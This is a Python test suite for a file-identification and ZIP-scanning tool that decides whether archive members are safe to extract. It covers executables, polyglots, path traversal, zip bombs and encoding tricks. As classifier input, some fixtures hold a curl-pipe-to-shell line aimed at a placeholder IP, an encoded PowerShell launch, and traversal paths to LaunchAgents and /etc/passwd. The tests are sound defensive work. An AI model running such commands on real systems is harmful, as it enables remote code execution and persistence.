"""Tests for identify.py and archive.py.

Every fixture here is authored in this file from harmless content. Nothing in
this suite touches the dataset, downloads anything, or executes anything.
A file whose first two bytes are "MZ" is not malware; it is two bytes.
"""

import io
import os
import sys
import unittest
import zipfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from archive import (  # noqa: E402
    MAX_DEPTH,
    MAX_RATIO,
    scan_stream_full,
    enumerate_zip,
    inspect_name,
    raw_name_bytes,
    summarise,
)
from identify import Verdict, identify  # noqa: E402


class TestIdentify(unittest.TestCase):
    def test_native_executables_are_never_materializable(self):
        for head, expected in [
            (b"MZ\x90\x00" + b"\x00" * 60, "PE executable (Windows)"),
            (b"\x7fELF\x02\x01\x01", "ELF executable (Linux/Unix)"),
            (b"\xcf\xfa\xed\xfe\x0c\x00\x00\x01", "Mach-O 64-bit (macOS)"),
        ]:
            with self.subTest(expected=expected):
                ident = identify(head, "harmless.bin")
                self.assertEqual(ident.kind, expected)
                self.assertEqual(ident.verdict, Verdict.NATIVE_EXECUTABLE)
                self.assertFalse(ident.materializable)
                self.assertTrue(ident.runnable)

    def test_name_cannot_lower_severity(self):
        """A PE named .txt is still a PE."""
        self.assertEqual(
            identify(b"MZ\x90\x00", "innocent.txt").verdict, Verdict.NATIVE_EXECUTABLE
        )

    def test_text_with_unlisted_extension_is_not_inert(self):
        """Text is inert only for an allowlisted extension.

        An earlier version asserted that text named `.exe` was `inert-data`,
        which enshrined the bug: `sh notes.txt` executes text, so "it is text"
        is not a safety property. The inert set is a positive allowlist.
        """
        ident = identify(b"just some notes\n", "scary.exe")
        self.assertEqual(ident.verdict, Verdict.UNKNOWN)
        self.assertFalse(ident.materializable)

    def test_windows_and_macos_script_extensions_are_not_inert(self):
        """The formats that run on a double-click, with no interpreter typed."""
        payload = b"@echo off\r\nstart /b powershell -nop -enc AAAA\r\n"
        for name in ("run.bat", "run.cmd", "evil.vbs", "evil.hta", "evil.wsf",
                     "install.command", "evil.desktop", "evil.scpt", "x.plist"):
            with self.subTest(name=name):
                ident = identify(payload, name)
                self.assertFalse(
                    ident.materializable, f"{name} must never be materializable"
                )
                self.assertTrue(ident.runnable)

    def test_offset_signature_requires_its_container_header(self):
        """`ftyp` at offset 4 is not a video without a valid box length.

        The regression: `#` plus spaces is a comment in sh, python and ruby at
        once, so `#   ftyp\\n<payload>` was classified an inert MP4 — even when
        named `.sh`.
        """
        ident = identify(b"#   ftyp\ncurl http://198.51.100.7/x | sh\n", "payload.sh")
        self.assertNotEqual(ident.verdict, Verdict.INERT_DATA)
        self.assertFalse(ident.materializable)

        ident = identify(b"#       WAVE\nimport os\n", "payload.py")
        self.assertFalse(ident.materializable)

        # A genuine MP4 still classifies correctly.
        real = (8).to_bytes(4, "big") + b"ftypisom" + b"\x00" * 32
        self.assertEqual(identify(real, "lecture.mp4").verdict, Verdict.INERT_DATA)

    def test_shebang_outranks_an_offset_signature(self):
        ident = identify(b"#!\t ftyp\necho hi\n", "thing")
        self.assertEqual(ident.verdict, Verdict.SCRIPT)

    def test_prefix_only_read_is_never_materializable(self):
        """`size` is load-bearing: a payload can live past the read window.

        The classification is KEPT (an MP4 header is still an MP4 header, and
        saying so teaches more than flattening every large file to 'unknown'),
        but it is marked provisional so it can never authorize a write.
        """
        head = b"# harmless notes\n" * 200
        ident = identify(head, "notes.txt", size=len(head) + 500_000)
        self.assertEqual(ident.verdict, Verdict.INERT_DATA)
        self.assertTrue(ident.provisional)
        self.assertFalse(ident.materializable)
        self.assertIn("not read", ident.caveat)
        # Same bytes, whole file seen -> inert.
        self.assertEqual(
            identify(head, "notes.txt", size=len(head)).verdict, Verdict.INERT_DATA
        )

    def test_pdf_is_not_inert(self):
        """PDFs carry /Launch, /JavaScript and /EmbeddedFile."""
        ident = identify(b"%PDF-1.7\n1 0 obj<</Type/Action/S/Launch>>", "doc.pdf")
        self.assertEqual(ident.verdict, Verdict.DOCUMENT_ACTIVE)
        self.assertFalse(ident.materializable)

    def test_japanese_text_at_the_read_boundary_still_classifies(self):
        """A multi-byte character split by the 4096-byte cut must not look binary."""
        for pad in range(3):
            with self.subTest(pad=pad):
                data = (b" " * pad) + "あ".encode() * 200
                self.assertEqual(
                    identify(data, "log.log", size=len(data)).verdict,
                    Verdict.INERT_DATA,
                )

    def test_gzf_is_sample_bearing_not_inert(self):
        """The Ghidra case: OS cannot run it, but it carries the sample."""
        head = b"\xac\xed\x00\x05\x77\x2d\x2e\x30\x21\x26\x34\xe9\x00\x07Program"
        ident = identify(head, "program.dll.gzf")
        self.assertEqual(ident.verdict, Verdict.SAMPLE_BEARING)
        self.assertIn("Ghidra", ident.kind)
        self.assertIn("recoverable", ident.caveat)
        self.assertFalse(ident.materializable)
        self.assertTrue(ident.runnable, "must be gated like a raw executable")

    def test_unknown_binary_gates_as_strictly_as_an_executable(self):
        """The load-bearing default-deny invariant."""
        ident = identify(b"\x01\x02\x03\xff\xfe\x00\x99\x88" * 8, "mystery.dat")
        self.assertEqual(ident.verdict, Verdict.UNKNOWN)
        self.assertFalse(ident.materializable)
        self.assertTrue(ident.runnable)

    def test_empty_file_is_unknown_not_inert(self):
        self.assertEqual(identify(b"", "empty").verdict, Verdict.UNKNOWN)

    def test_shebang_is_a_script_even_without_an_extension(self):
        ident = identify(b"#!/bin/sh\necho hello\n", "noextension")
        self.assertEqual(ident.verdict, Verdict.SCRIPT)
        self.assertIn("execute bit", ident.caveat)

    def test_source_code_is_a_script_not_inert_text(self):
        ident = identify(b"print('hello')\n", "helper.py")
        self.assertEqual(ident.verdict, Verdict.SCRIPT)
        self.assertFalse(ident.materializable)

    def test_plain_text_is_inert_and_materializable(self):
        ident = identify("これはただのログです\n".encode(), "notes.log")
        self.assertEqual(ident.verdict, Verdict.INERT_DATA)
        self.assertTrue(ident.materializable)

    def test_nul_byte_disqualifies_text(self):
        self.assertEqual(identify(b"looks like text\x00but is not").verdict, Verdict.UNKNOWN)

    def test_pdf_zip_polyglot_is_demoted_to_unknown(self):
        """ZIP is found by its END record, so a PDF can also be a ZIP."""
        head = b"%PDF-1.4\n" + b"A" * 64 + b"PK\x05\x06" + b"\x00" * 18
        ident = identify(head, "report.pdf")
        self.assertEqual(ident.verdict, Verdict.UNKNOWN)
        self.assertIn("polyglot", ident.caveat)
        self.assertFalse(ident.materializable)

    def test_jar_is_bytecode_archive_not_plain_container(self):
        ident = identify(b"PK\x03\x04\x14\x00", "tool.jar")
        self.assertEqual(ident.verdict, Verdict.BYTECODE_ARCHIVE)
        self.assertTrue(ident.runnable)

    def test_macro_office_document_is_active_content(self):
        self.assertEqual(
            identify(b"PK\x03\x04\x14\x00", "invoice.docm").verdict,
            Verdict.DOCUMENT_ACTIVE,
        )
        self.assertEqual(
            identify(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1", "old.doc").verdict,
            Verdict.DOCUMENT_ACTIVE,
        )

    def test_unsupported_containers_are_blocked_not_assumed_safe(self):
        for head, name in [
            (b"7z\xbc\xaf\x27\x1c\x00\x04", "data.7z"),
            (b"\xfd7zXZ\x00\x00", "answers.tar.xz"),
        ]:
            with self.subTest(name=name):
                ident = identify(head, name)
                self.assertEqual(ident.verdict, Verdict.UNSUPPORTED_CONTAINER)
                self.assertFalse(ident.materializable)

    def test_lnk_is_a_launcher(self):
        head = b"L\x00\x00\x00\x01\x14\x02\x00" + b"\x00" * 8
        self.assertEqual(identify(head, "doc.lnk").verdict, Verdict.SHORTCUT_LAUNCHER)


class TestNameInspection(unittest.TestCase):
    def test_shift_jis_trail_byte_is_flagged(self):
        """The 「ソ」 problem: CP932 encodes ソ as 0x83 0x5C.

        A byte-level extractor on Windows sees the 0x5C as a backslash; a
        decoder sees one Japanese character. That disagreement is the bug.
        """
        raw = "ソフト.txt".encode("cp932")
        self.assertIn(0x5C, raw, "fixture must contain the ambiguous byte")
        warnings = inspect_name(raw, raw.decode("cp932"))
        self.assertTrue(any("Shift_JIS" in w for w in warnings), warnings)

    def test_plain_japanese_name_without_ambiguity_is_clean(self):
        raw = "静的解析.log".encode("cp932")
        self.assertEqual(inspect_name(raw, raw.decode("cp932")), [])

    def test_dotdot_traversal_is_flagged(self):
        raw = b"../../../Library/LaunchAgents/evil.plist"
        self.assertTrue(any(".." in w for w in inspect_name(raw, raw.decode())))

    def test_absolute_path_is_flagged(self):
        raw = b"/etc/passwd"
        self.assertTrue(any("absolute" in w for w in inspect_name(raw, raw.decode())))

    def test_rtl_override_is_flagged(self):
        name = "photo‮gnp.exe"
        self.assertTrue(
            any("bidirectional" in w for w in inspect_name(name.encode(), name))
        )


def _zip_bytes(entries, ratio_bomb=False) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, data in entries:
            zf.writestr(name, data)
        if ratio_bomb:
            zf.writestr("bomb.bin", b"\x00" * (MAX_RATIO * 4096))
    return buf.getvalue()


class TestEnumerate(unittest.TestCase):
    def setUp(self):
        self.tmp = os.path.join(
            os.environ.get("TMPDIR", "/tmp"), f"mws-test-{os.getpid()}.zip"
        )
        self.addCleanup(lambda: os.path.exists(self.tmp) and os.remove(self.tmp))

    def _write(self, payload: bytes) -> str:
        with open(self.tmp, "wb") as fh:
            fh.write(payload)
        return self.tmp

    def test_members_are_classified_by_content(self):
        path = self._write(
            _zip_bytes(
                [
                    ("notes.log", b"just a log line\n"),
                    ("payload.bin", b"MZ\x90\x00" + b"\x00" * 40),
                    ("helper.py", b"print(1)\n"),
                ]
            )
        )
        listing = enumerate_zip(path)
        by_name = {m.name: m for m in listing.members}
        self.assertEqual(by_name["notes.log"].verdict, Verdict.INERT_DATA)
        self.assertTrue(by_name["notes.log"].materializable)
        self.assertEqual(by_name["payload.bin"].verdict, Verdict.NATIVE_EXECUTABLE)
        self.assertFalse(by_name["payload.bin"].materializable)
        self.assertEqual(by_name["helper.py"].verdict, Verdict.SCRIPT)

    def test_traversal_name_blocks_materialization_even_for_inert_bytes(self):
        """Inert content plus a hostile name must still be blocked."""
        path = self._write(_zip_bytes([("../../escape.txt", b"harmless text\n")]))
        member = enumerate_zip(path).members[0]
        self.assertEqual(member.verdict, Verdict.INERT_DATA)
        self.assertTrue(member.warnings)
        self.assertFalse(member.materializable, "warnings must veto materialization")

    def test_ratio_bomb_is_flagged(self):
        path = self._write(_zip_bytes([("ok.txt", b"hi\n")], ratio_bomb=True))
        bomb = [m for m in enumerate_zip(path).members if m.name == "bomb.bin"][0]
        self.assertTrue(any("bomb" in w for w in bomb.warnings), bomb.warnings)

    def test_encrypted_member_is_opaque_never_inert(self):
        path = self._write(_zip_bytes([("secret.bin", b"whatever")]))
        with open(path, "r+b") as fh:  # set the encryption flag post-hoc
            data = bytearray(fh.read())
            idx = data.find(b"PK\x03\x04")
            data[idx + 6] |= 0x01
            idx2 = data.find(b"PK\x01\x02")
            data[idx2 + 8] |= 0x01
            fh.seek(0)
            fh.write(data)
        member = enumerate_zip(path).members[0]
        self.assertTrue(member.encrypted)
        self.assertEqual(member.verdict, Verdict.OPAQUE_ENCRYPTED)
        self.assertFalse(member.materializable)

    def test_applesingle_sidecar_is_flagged(self):
        path = self._write(
            _zip_bytes([("__MACOSX/._tools.zip", b"\x00\x05\x16\x07rubbish")])
        )
        member = enumerate_zip(path).members[0]
        self.assertTrue(any("AppleDouble" in w for w in member.warnings))

    def test_corrupt_archive_fails_closed(self):
        path = self._write(b"this is not a zip file at all")
        listing = enumerate_zip(path)
        self.assertEqual(listing.members, [])
        self.assertTrue(listing.warnings)

    def test_summarise_counts_verdicts(self):
        path = self._write(
            _zip_bytes([("a.log", b"x\n"), ("b.log", b"y\n"), ("c.bin", b"MZ\x00")])
        )
        counts = summarise(enumerate_zip(path))
        self.assertEqual(counts["inert-data"], 2)
        self.assertEqual(counts["native-executable"], 1)


if __name__ == "__main__":
    unittest.main(verbosity=2)


class TestFullStreamScan(unittest.TestCase):
    """The check that must pass before anything is written to disk."""

    def _member(self, data: bytes, name: str):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr(name, data)
        buf.seek(0)
        zf = zipfile.ZipFile(buf)
        return zf, zf.infolist()[0]

    def test_polyglot_past_the_prefix_is_caught_only_by_the_full_scan(self):
        """A ZIP is found by its END record, so a prefix scan cannot see it."""
        inner = io.BytesIO()
        with zipfile.ZipFile(inner, "w") as z:
            z.writestr("payload.txt", b"x")
        polyglot = b"%PDF-1.4\n" + b"A" * 8000 + inner.getvalue()

        # The prefix scan sees only a PDF header.
        prefix = identify(polyglot[:4096], "report.pdf", size=len(polyglot))
        self.assertNotIn("polyglot", prefix.caveat)

        # The whole-stream scan catches it.
        zf, info = self._member(polyglot, "report.pdf")
        with zf, zf.open(info) as fh:
            ident, digest, total = scan_stream_full(fh, "report.pdf", info.file_size)
        # The embedded archive is reported, and the file stays unwritable. The
        # verdict is NOT flattened to `unknown`: PDF is already the more severe
        # and more informative answer, and both block a write.
        self.assertIn("whole-file scan found", ident.caveat.lower())
        self.assertFalse(ident.materializable)
        self.assertFalse(ident.provisional, "the whole stream was read")
        self.assertNotIn("only the first", ident.caveat.lower())
        self.assertEqual(total, len(polyglot))
        self.assertEqual(len(digest), 64)

    def test_benign_prefix_hostile_tail_is_caught(self):
        data = b"# notes\n" * 700 + b"MZ\x90\x00" + b"\x00" * 200
        zf, info = self._member(data, "notes.txt")
        with zf, zf.open(info) as fh:
            ident, _, _ = scan_stream_full(fh, "notes.txt", info.file_size)
        self.assertFalse(ident.materializable)

    def test_genuinely_inert_text_passes_the_full_scan(self):
        data = "ログ行\n".encode() * 500
        zf, info = self._member(data, "server.log")
        with zf, zf.open(info) as fh:
            ident, _, total = scan_stream_full(fh, "server.log", info.file_size)
        self.assertEqual(ident.verdict, Verdict.INERT_DATA)
        self.assertFalse(ident.provisional, "whole file was read")
        self.assertTrue(ident.materializable)
        self.assertEqual(total, len(data))


class TestNestedArchives(unittest.TestCase):
    def setUp(self):
        self.tmp = os.path.join(
            os.environ.get("TMPDIR", "/tmp"), f"mws-nest-{os.getpid()}.zip"
        )
        self.addCleanup(lambda: os.path.exists(self.tmp) and os.remove(self.tmp))

    def test_nested_members_are_enumerated_and_marked(self):
        inner = io.BytesIO()
        with zipfile.ZipFile(inner, "w") as z:
            z.writestr("deep/notes.log", b"hello\n")
            z.writestr("deep/payload.bin", b"MZ\x90\x00" + b"\x00" * 40)
        with zipfile.ZipFile(self.tmp, "w") as z:
            z.writestr("outer.txt", b"top level\n")
            z.writestr("bundle.zip", inner.getvalue())

        members = enumerate_zip(self.tmp).members
        nested = [m for m in members if m.container]
        self.assertEqual(len(nested), 2, [m.name for m in members])
        self.assertTrue(all(m.name.startswith("bundle.zip :: ") for m in nested))
        pe = [m for m in nested if m.name.endswith("payload.bin")][0]
        self.assertEqual(pe.verdict, Verdict.NATIVE_EXECUTABLE)
        self.assertFalse(pe.materializable)

    def test_recursion_stops_at_max_depth(self):
        blob = io.BytesIO()
        with zipfile.ZipFile(blob, "w") as z:
            z.writestr("bottom.txt", b"x")
        for _ in range(MAX_DEPTH + 2):
            outer = io.BytesIO()
            with zipfile.ZipFile(outer, "w") as z:
                z.writestr("nest.zip", blob.getvalue())
            blob = outer
        with open(self.tmp, "wb") as fh:
            fh.write(blob.getvalue())

        members = enumerate_zip(self.tmp).members
        depths = [m.name.count(" :: ") for m in members]
        self.assertLessEqual(max(depths), MAX_DEPTH, "recursion must be bounded")
